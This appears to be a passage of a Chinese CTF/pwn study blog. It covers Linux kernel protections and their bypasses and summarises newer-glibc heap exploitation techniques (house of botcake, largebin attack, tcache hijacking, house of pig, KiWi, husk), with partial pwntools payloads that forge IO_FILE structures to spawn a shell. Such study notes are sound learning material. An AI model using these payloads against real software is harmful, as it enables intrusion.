ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p><h2 id="I-x2F-O"><a href="#I-x2F-O" class="headerlink" title="I&#x2F;O"></a>I&#x2F;O</h2><h3 id="万物皆文件"><a href="#万物皆文件" class="headerlink" title="万物皆文件"></a>万物皆文件</h3><p>在Linux系统的视角下，一切都可以被抽象成文件，都可以通过使用访问文件的方式进行操作。通过这种高层次的抽象统一性，提供了操作的一致性：</p><ul><li>所有的读取操作都可以通过read</li><li>所有的更改操作都可以通过write进行</li></ul><h3 id="进程文件系统"><a href="#进程文件系统" class="headerlink" title="进程文件系统"></a>进程文件系统</h3><p>进程文件系统（process file system， 简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等</p><p>进程文件系统本身是一个伪文件系统，通常被挂载到<code>/proc</code>目录下，并不真正占用储存空间，而是占用一定的内存</p><p>当一个进程被建立起来时，其进程文件系统便会被挂载到<code>/proc/[PID]</code>下，我们可以在该目录下查看其相关信息</p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>在之前的pwn的学习中，我们已经了解过一些文件描述符了，尤其是在IO FILE利用部分</p><p>进程通过文件描述符来完成对文件的访问。每个进程独立的有一个文件描述符表，存放着该进程所打开的文件索引。每当进程成功打开一个文件时，就会把他加到文件描述符的链表里面。</p><p>在kernel中有一个文件表，由所有的进程共享</p><p><img src="/../images/1696426968329.png" alt="1696426968329"></p><h2 id="系统调用：ioctl"><a href="#系统调用：ioctl" class="headerlink" title="系统调用：ioctl"></a>系统调用：ioctl</h2><p>在*NIX中一切都可以被视为文件，因而一切都可以以访问文件的方式进行操作，为了方便，Linux定义了系统调用<code>ioctl</code>供进程与设备之间进行通信</p><p>系统调用<code>ioctl</code>是一个专用于设备输入输出操作的一个系统调用，其调用方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span></span><br></pre></td></tr></table></figure><p>对于一个提供了ioctl通信方式的设备而言，我们可以通过其文件描述符、使用不同的请求码及其他请求参数通过ioctl系统调用完成不同的对设备的I&#x2F;O操作</p><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>看不懂，以后再说</p><h2 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h2><h3 id="通用保护机制"><a href="#通用保护机制" class="headerlink" title="通用保护机制"></a>通用保护机制</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>和ASLR的作用相似，都是地址空间随机化。这是指内核镜像用射到的实际的地址空间时加上一个偏移值。但是内核内部的相对偏移还是不变的，在未开启KASLR保护机制的时候，内核段的基地址为 <code>0xffffffff81000000</code> ，direct mapping area 的基址为 <code>0xffff888000000000</code></p><h4 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="*FGKASLR"></a>*<em>FGKASLR</em></h4><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，<strong>以函数粒度重新排布内核代码</strong></p><h4 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h4><p>类似于用户态的canary保护，通常又被叫做 stack cookies，用来检测时候发送内核堆栈溢出，若是发生内核堆栈溢出会产生kernel panic</p><p>与用户态相似，内核的canary的值通常取自gs段寄存器的某个固定偏移的值</p><h4 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h4><p>SMAP即 <code>管理模式保护访问</code> （Supervisor Mode Access Prevention），SMEP即<code>管理模式执行保护</code>（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用来阻止 <strong>内核空间直接访问&#x2F;执行用户空间的数据</strong> 通过这两种保护把内核空间和用户空间分隔开</p><p>SMAP绕过方法有如下两种</p><ul><li>利用内核线性映射区对物理地址的完整映射，找到用户空间对应页框的内核空间地址。利用该内核地址完整对用户空间的访问，这种手法被叫做 <code>ret2dir</code> </li><li>Intel下根据 <strong>CR4</strong> 控制寄存器的第20位标识是否开启SMEP保护，若是通过 KernelROP改变该值，就可以关闭保护，从而进行 <code>ret2usr</code>  <strong>但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式</strong></li></ul><h3 id="内核“堆”上保护机制"><a href="#内核“堆”上保护机制" class="headerlink" title="内核“堆”上保护机制"></a>内核“堆”上保护机制</h3><p>more details <a href="https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022">这里</a></p>]]></content>
      
      
      <categories>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高版本glibc利用总结</title>
      <link href="/2023/09/11/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2023/09/11/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="高版本glibc利用总结"><a href="#高版本glibc利用总结" class="headerlink" title="高版本glibc利用总结"></a>高版本glibc利用总结</h1><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><h3 id="libc版本："><a href="#libc版本：" class="headerlink" title="libc版本："></a>libc版本：</h3><p>libc2.28-libc2.30</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>此版本下，对tcache_entry加入了key字段且key字段的值为tcachebin+0x10。无法方便的完成doublefree</p><h3 id="利用流程："><a href="#利用流程：" class="headerlink" title="利用流程："></a>利用流程：</h3><ol><li>先填满tcachebin且size＞0x80</li><li>再连续free两个chunk，要求A在B的上方且B的size和第一步放入tcache的chunk的size相同，让他们合并后进入unsortedbin</li><li>从tcache中取出一个chunk</li><li>利用uaf，将b给doublefree进入到tcache，可以避开key字段的检测</li></ol><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><h3 id="libc版本：-1"><a href="#libc版本：-1" class="headerlink" title="libc版本："></a>libc版本：</h3><ol><li>libc2.28以后，加入了对unsoredbin的bk指针的检测，此后unsortedbin不再起作用</li><li>libc2.30之后，加入了对largebin的检查，largebin attack被限制，但是仍然可以利用</li></ol><h3 id="利用流程：-1"><a href="#利用流程：-1" class="headerlink" title="利用流程："></a>利用流程：</h3><p>之前的利用中，我们选择了第二个分支，在其中修改bk为target_addr-0x10,在bk_nextsize中写入target_addr-0x20,就可以在target_addr出写入largebin的首个chunk的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; <span class="comment">// 1</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>free一个A到largebinlist，并修改其bk为 <em>target_addr-0x20</em> </li><li>free一个size略微小于A的chunk，这样可以和A进入同一个largebin，这时候target_addr就会写入B的堆地址</li><li>若只为了写入大数字，此时已经完成了利用，但是往往我们需要修复largebin list<ol><li>首先取出B，这时候会在target_addr出写入A的堆地址</li><li>利用uaf等修复A，并取出，此时可以对A进行一些伪造，相当于伪造target_addr</li></ol></li></ol><h2 id="Tcache-Perthread-struct劫持"><a href="#Tcache-Perthread-struct劫持" class="headerlink" title="Tcache_Perthread_struct劫持"></a>Tcache_Perthread_struct劫持</h2><h3 id="libc版本：-2"><a href="#libc版本：-2" class="headerlink" title="libc版本："></a>libc版本：</h3><p>libc2.30及以下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>libc2.30及以上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>其中， <code>TCACHE_MAX_BINS</code> 为64，该结构体位于chunk首地址</p><h3 id="利用流程：-2"><a href="#利用流程：-2" class="headerlink" title="利用流程："></a>利用流程：</h3><ol><li>在libc2.30及以下中，取出tcache并不会检测count，因此可以任意利用</li><li>在libc2.30及以上版本中，会检测count&gt;0是否成立，因此count不可以小于0</li><li>可以劫持TLS结构体中的 <code>tcache pointer</code> 对于其中的chunk进行伪造</li><li>对于 <code>Tcache struct</code> 的溢出，可以修改 <code>mp_.tache_bins</code> 写入一个大数值，类似于修改global_max_fast，之后free的chunk都会放入tcache中。</li></ol><h2 id="Decrypt："><a href="#Decrypt：" class="headerlink" title="Decrypt："></a>Decrypt：</h2><p>在高版本中，tcache和fastbin增加了对next指针的保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>简单的说就是堆块的地址右移12位之后，与 <code>fd/next</code> 指针进行异或，得到的结果作为新的next，但是当tcache中只有一个chunk的时候，next指针为0，这时候存放的就是 <code>pos&gt;&gt;12</code> 的值，可以通过泄露这个值来用来decrypt，进行绕过</p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><p>首先看 <code>_IO_str_overflow</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>这段代码我们在2.24下的FSOP中已经分析过了，那里提到了高版本使用了malloc，所以会导致第二种方法失效，但是这里提出了一种对于高版本的攻击方法</p><p>在这段代码中我们先后执行了 malloc memcpy free三个函数，很容易想到，我们先malloc一个堆块，堆块中有free_hook相关内容，之后我们在memcpy中进行赋值随后进行free，那我们就可以修改freehook为system从而进行getshell</p><p>比如说，先利用<code>tcache stashing unlink attack</code>或者劫持<code>TLS</code>中的<code>tcache pointer</code>等方式，在<code>0xa0</code>的<code>tcache bin</code>中伪造一个<code>__free_hook - 0x10</code>在链首，然后伪造<code>IO_FILE</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment"># set _IO_write_ptr</span></span><br><span class="line"><span class="comment"># fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(fake_IO_FILE_addr + <span class="number">0xe0</span>) + p64(fake_IO_FILE_addr + <span class="number">0xf8</span>)</span><br><span class="line"><span class="comment"># set _IO_buf_base &amp; _IO_buf_end   old_blen = 0x18</span></span><br><span class="line">fake_IO_FILE = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(get_IO_str_jumps())</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>最后通过exit触发，就可以getshell，但是在2.34以及以后的，hook就被删除了，但是我们仍然可以利用memset，那我们就可以来改写memset 的got表</p><p>先在<code>0xa0</code>的<code>tcache</code>链表头伪造一个<code>memset_got_addr</code>的地址，并伪造<code>IO_FILE</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># magic_gadget：mov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]</span></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(fake_stderr_addr+<span class="number">0xf0</span>) + p64(fake_stderr_addr+<span class="number">0x108</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># srop</span></span><br><span class="line">fake_stderr += p64(rop_address + <span class="number">0x10</span>) + p64(ret_addr) <span class="comment"># rsp rip</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc.sym[<span class="string">&#x27;_IO_str_jumps&#x27;</span>] - <span class="number">0x20</span>)</span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_stderr += p64(magic_gadget) + p64(<span class="number">0</span>) <span class="comment"># r14 r14+8</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_stderr += p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span>) <span class="comment"># r14 + 0x38</span></span><br></pre></td></tr></table></figure><h2 id="house-of-KiWi"><a href="#house-of-KiWi" class="headerlink" title="house of KiWi"></a>house of KiWi</h2><p>主要提供了一种在程序中触发IO的思路，并且可以控制rdx，可以很方便的进行orw</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// assert.h</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined __cplusplus</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> assert(expr)                            \</span></span><br><span class="line"><span class="meta">     (static_cast <span class="string">&lt;bool&gt;</span> (expr)                        \</span></span><br><span class="line"><span class="meta">      ? void (0)                            \</span></span><br><span class="line"><span class="meta">      : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))</span></span><br><span class="line"><span class="meta"># <span class="keyword">elif</span> !defined __GNUC__ || defined __STRICT_ANSI__</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> assert(expr)                            \</span></span><br><span class="line"><span class="meta">    ((expr)                                \</span></span><br><span class="line"><span class="meta">     ? __ASSERT_VOID_CAST (0)                        \</span></span><br><span class="line"><span class="meta">     : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> assert(expr)                            \</span></span><br><span class="line"><span class="meta">  ((void) sizeof ((expr) ? 1 : 0), __extension__ (&#123;            \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (expr)                                \</span></span><br><span class="line"><span class="meta">        ; <span class="comment">/* empty */</span>                            \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>                                \</span></span><br><span class="line"><span class="meta">        __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION);    \</span></span><br><span class="line"><span class="meta">    &#125;))</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// malloc.c ( #include &lt;assert.h&gt; )</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)            \</span></span><br><span class="line"><span class="meta">     __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line, <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在malloc.c中，调用了assert断言，最终调用了__malloc_assert_ ，这其中会使用一个fllush函数，这个函数是走io的最终会调用到其<code>vtable</code>中<code>_IO_file_jumps</code>中的<code>__IO_file_sync</code>，此时<code>rdx</code>为<code>IO_helper_jumps</code></p><p>遇到开启了沙盒需要orw的情况，我们一般会利用setcontext来控制rsp，进而跳转rop，但是在2.29以上的setcontext中，参数由rdi变成了rdx，起始位置也从setcontext+53变成了setcontext+61(2.29版本仍是setcontext+53但是参数已经是由rdx进行控制了)，house of kiwi就是一种可以帮助我们很方便的控制rdx的方法</p><p>首先我们要考虑如何触发malloc的assert报错：</p><ol><li><p>在 <code>_int_malloc</code> 中判断topchunk的大小过小，无法再次进行分配的时候，会进行sysmalloc中的断言，这段在house of orange中也有体现，house of orange的第一步如何在缺少free的时候获得一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>因此，我们可以学习house of orange的方法，修改topchunk的size 并且修改prev_size为0，当topchunk不满足分配条件的时候，就会调用这个assert</p></li><li><p>在 <code>_int_malloc</code> 中，如果堆块从 <em>unsortedbin</em> 中转到 <em>largebin list</em> 的时候，也会有一些断言如 <code>(chunk_main_arena (bck-&gt;bk))</code>，<code>assert (chunk_main_arena (fwd))</code></p></li></ol><h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><p><a href="https://www.anquanke.com/post/id/202387">house-of-husk学习笔记-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>这里利用的printf的一个调用的chain，应用场景为只能分配较大chunk，存在或者可以构造出来UAF漏洞</p><p>首先知道在使用<code>printf</code>类格式化字符串函数进行输出的时候，该类函数会根据我们格式化字符串的种类不同而采取不同的输出格式进行输出，在glibc中有这样一个函数<code>__register_printf_function</code>，为格式化字符为<code>spec</code>的格式化输出注册函数，这个函数是<code>__register_printf_specifier</code>函数的封装。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">    printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> 